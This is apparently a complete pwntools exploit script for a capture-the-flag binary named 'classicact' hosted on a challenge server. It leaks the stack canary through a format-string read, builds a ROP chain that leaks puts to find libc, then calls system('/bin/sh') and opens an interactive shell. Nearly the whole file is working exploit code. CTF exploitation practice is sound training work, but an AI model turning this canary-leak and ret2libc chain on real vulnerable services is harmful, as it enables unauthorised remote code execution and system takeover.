#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 0.cloud.chals.io --port 10058 classicact
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('classicact')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 10058)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc = None

if args.LOCAL:
    libc = ELF('/usr/lib/libc.so.6')
else:
    libc = ELF('libc6_2.31-0ubuntu9.7_amd64.so')

io = start()

io.sendlineafter(b"Please enter your name!\n", "%{}$p".format((0x70-0x8) // 8 + 6).encode())
io.recvuntil(b"Hello:\n")

canary = int(io.recvuntil(b"\n", drop=True), 0)
io.success("Canary: {}".format(hex(canary)))

rop = ROP(exe)
rop.call(exe.plt['puts'], [exe.got['puts']])
rop.call(exe.sym['main'])
print(rop.dump())
io.sendlineafter(b"What would you like to do today?\n", flat({
    0x50-0x8: canary,
    0x50+0x8: rop.chain(),
    }))
io.recvuntil(b"Good luck doing that!\n")

puts = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\x00'))
io.info("puts: {}".format(hex(puts)))

libc.address = puts - libc.sym['puts']
io.success("Libc: {}".format(hex(libc.address)))

io.sendlineafter(b"Please enter your name!\n", b"a")
rop = ROP(exe)
rop.raw(rop.ret)
rop.call(libc.sym['system'], [next(libc.search(b"/bin/sh"))])
print(rop.dump())
io.sendlineafter(b"What would you like to do today?\n", flat({
    0x50-0x8: canary,
    0x50+0x8: rop.chain(),
    }))

io.interactive()

